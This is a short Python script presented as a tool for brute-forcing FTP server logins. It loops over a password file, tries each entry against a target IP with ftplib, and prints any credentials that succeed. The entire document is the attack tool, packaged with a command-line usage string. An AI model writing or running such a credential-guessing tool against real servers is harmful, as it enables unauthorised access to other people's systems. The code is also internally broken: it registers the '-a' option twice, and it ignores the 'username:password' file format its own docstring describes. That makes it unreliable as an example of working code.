"""This python script bruteforces ftp server logins using usernames and passwords from the text file supplied.
The text file is structured as shown below:
username:password"""

import optparse
import ftplib

def bruteforceftp(hostaddress, username, password):
	try:
		ftp = ftplib.FTP(hostaddress)
		ftp.login(username, password)
	except:
		print('[-]Login failed.')
		print('Wrong_details: ' + username + ' : ' + password)
		return False
	else:
		print('[+]Login successful.')
		print('Login_details: '+ username + ' : ' + password)
		ftp.quit()
		return True
	

def main():
	parser = optparse.OptionParser('-a <ip_address> -u <username> -f <username-password_file>')
	parser.add_option('-a', type='string', dest='ipaddress', help='Enter a valid ip address')
	parser.add_option('-a', type="string", dest="username", help="Enter a username")
	parser.add_option('-f', type='string', dest='textfile', help='Enter the appropriate document')
	parser.usage = '[*]Run: python script.py -a <ip_address> -u <username> -f <textfile>'
	(options, args) = parser.parse_args()
	if (options.ipaddress == None) or (options.textfile == None) or (options.username == None):
		print(parser.usage)
		exit()
	else:
		ipaddress = options.ipaddress
		upfile = options.textfile
		username = options.username
	
	content = open(upfile)
	for line in content.readlines():
		password = line

		result = bruteforceftp(ipaddress, username, password)
		if result:
			exit()
		else:
			continue
		
if __name__ == '__main__':
	main()
